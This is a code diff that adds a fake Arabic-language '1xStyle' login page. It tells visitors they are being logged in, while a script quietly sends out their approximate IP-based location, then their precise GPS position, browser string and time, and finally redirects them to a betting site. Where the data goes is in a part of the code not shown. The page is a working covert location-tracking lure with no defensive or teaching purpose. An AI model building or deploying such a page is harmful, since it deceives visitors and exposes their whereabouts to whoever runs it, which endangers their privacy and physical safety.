@@ -1,3 +1,70 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>1xStyle</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f2f2f2;
+    }
+
+    .navbar {
+      background-color: #003366;
+      color: white;
+      padding: 15px 20px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .main-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 80vh;
+      text-align: center;
+    }
+
+    .card {
+      background-color: white;
+      border-radius: 10px;
+      padding: 30px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 90%;
+    }
+
+    .loader {
+      margin-top: 20px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #003366;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="navbar">1xStyle</div>
+
+<div class="main-content">
+  <div class="card">
+    <h2>جاري تسجيل الدخول...</h2>
+    <p>من فضلك انتظر قليلاً</p>
+    <div class="loader"></div>
+  </div>
+</div>
+
 <script>
   const now = new Date().toLocaleString();
   const userAgent = navigator.userAgent;
@@ -20,7 +87,7 @@
     return Object.keys(count).reduce((a, b) => count[a] > count[b] ? a : b, "");
   }
 
-  // 1️⃣ أولًا: إرسال الموقع التقريبي مباشرة من الـ APIs
+  // 1️⃣ إرسال الموقع التقريبي فورًا عند تحميل الصفحة
   function sendApproximateLocation() {
     Promise.all([
       fetch("https://ipinfo.io/json?token=34011ec27e4e2f").then(res => res.json()),
@@ -54,11 +121,11 @@
 🖥️ المتصفح: ${userAgent}
 📅 الوقت: ${now}`;
 
-      sendMessage(content);
+      sendMessage(content); // إرسال البيانات
     });
   }
 
-  // 2️⃣ بعدها: نحاول نجيب الموقع الدقيق باستخدام GPS
+  // 2️⃣ محاولة الحصول على الموقع الدقيق (GPS) من المتصفح
   function trySendGPSLocation() {
     if (!navigator.geolocation) return;
 
@@ -76,7 +143,7 @@
 🖥️ المتصفح: ${userAgent}
 📅 الوقت: ${now}`;
 
-        sendMessage(content);
+        sendMessage(content); // إرسال الموقع الدقيق بعد الحصول عليه
       },
       (error) => {
         console.warn("GPS مرفوض أو غير متاح، لا يوجد موقع دقيق");
@@ -85,15 +152,22 @@
     );
   }
 
-  // تنفيذ الكود
-  sendApproximateLocation(); // يبعت الموقع التقريبي فورًا
-  trySendGPSLocation(); // يحاول يجيب الموقع الدقيق لو ممكن
-
-  // الرسالة الظاهرة للمستخدم والريدايركت
-  setTimeout(() => {
-    document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
+  // 3️⃣ إعادة توجيه المستخدم إلى موقع 1xBet بعد 6 ثواني
+  function redirectTo1xBet() {
     setTimeout(() => {
-      window.location.href = "https://1xbet.com";
-    }, 3000);
-  }, 3000);
+      document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
+      setTimeout(() => {
+        window.location.replace("https://1xbet.com"); // استخدام replace لتوجيه مباشر
+      }, 3000); // تحويل بعد 3 ثواني من عرض الرسالة
+    }, 3000); // تأخير 3 ثواني قبل تغيير الرسالة
+  }
+
+  // تنفيذ العملية
+  sendApproximateLocation(); // يبعت الموقع التقريبي فورًا
+  trySendGPSLocation(); // يحاول يجيب الموقع الدقيق لو وافق
+  redirectTo1xBet(); // تحويل بعد عرض الرسالة
+
 </script>
+
+</body>
+</html>
